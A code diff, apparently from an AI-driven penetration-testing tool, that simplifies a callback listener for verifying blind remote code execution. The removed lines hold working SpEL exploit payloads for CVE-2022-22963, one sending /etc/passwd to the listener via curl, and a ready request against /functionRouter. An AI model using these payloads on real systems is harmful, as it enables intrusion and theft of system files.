@@ -83,15 +83,12 @@ def start_callback_listener(port: int = 9999, lhost: str = "host.docker.internal
     """Start an HTTP callback listener to verify blind RCE.
 
     Binds a lightweight HTTP server on the specified port. Returns a unique
-    token, callback URL, and pre-built SpEL payloads for Java targets.
+    token and callback URL for out-of-band verification (e.g. blind RCE,
+    SSRF, XXE).
 
     The listener auto-shuts-down after 10 minutes.
 
-    For Java/Spring targets (like CVE-2022-22963), use the returned
-    'spel_payload' directly as the spring.cloud.function.routing-expression
-    header value. Uses T(java.lang.Runtime).getRuntime().exec() with curl.
-
-    IMPORTANT: The lhost parameter must be an address the TARGET can reach
+    The lhost parameter must be an address the TARGET can reach
     (e.g. host.docker.internal for Docker targets). Do NOT use 127.0.0.1 —
     that resolves to the target container itself.
 
@@ -100,8 +97,7 @@ def start_callback_listener(port: int = 9999, lhost: str = "host.docker.internal
         lhost: Address the target uses to reach this listener (default: host.docker.internal).
 
     Returns:
-        Dict with keys: port, token, callback_url, spel_payload,
-        spel_exfil_payload, status, message.
+        Dict with keys: status, port, token, callback_url, message.
     """
     token = secrets.token_urlsafe(12)
 
@@ -141,46 +137,14 @@ def start_callback_listener(port: int = 9999, lhost: str = "host.docker.internal
     callback_url = f"http://{lhost}:{bound_port}{callback_path}"
     logger.info("Callback listener started on port %d, token=%s", bound_port, token)
 
-    # Pre-built SpEL payloads using Runtime.exec (proven for CVE-2022-22963)
-    # MUST use bash -c wrapper — direct exec of curl doesn't reliably fire
-    # in the JVM subprocess context (no shell PATH/env inheritance).
-    spel_simple = (
-        'T(java.lang.Runtime).getRuntime().exec(new String[]'
-        f'{{"bash","-c","curl {callback_url}"}})'
-    )
-    spel_exfil = (
-        'T(java.lang.Runtime).getRuntime().exec(new String[]'
-        f'{{"bash","-c","curl -d @/etc/passwd {callback_url}"}})'
-    )
-
     return {
         "status": "listening",
         "port": bound_port,
         "token": token,
         "callback_url": callback_url,
-        "spel_payload": spel_simple,
-        "spel_exfil_payload": spel_exfil,
-        "usage_example": {
-            "tool": "proxy_request",
-            "args": {
-                "method": "POST",
-                "url": "http://TARGET:PORT/functionRouter",
-                "headers": {
-                    "spring.cloud.function.routing-expression": spel_simple,
-                    "Content-Type": "text/plain",
-                },
-                "body": "test",
-            },
-        },
         "message": (
             f"Listening on 0.0.0.0:{bound_port}. "
-            f"CRITICAL: Use the EXACT 'spel_payload' value as the header — do NOT "
-            f"modify it or construct your own. The payload uses bash -c which is "
-            f"REQUIRED for the JVM subprocess to resolve DNS and exec curl. "
-            f"Do NOT use 127.0.0.1 as lhost (that resolves to the target itself). "
-            f"Do NOT try alternative IPs — host.docker.internal is confirmed working. "
-            f"EXPECTED BEHAVIOR: The exploit returns HTTP 500 — this is NORMAL. "
-            f"Verify success ONLY via check_callback_received(token='{token}')."
+            f"Use check_callback_received(token='{token}') to verify if a request was received."
         ),
     }
 
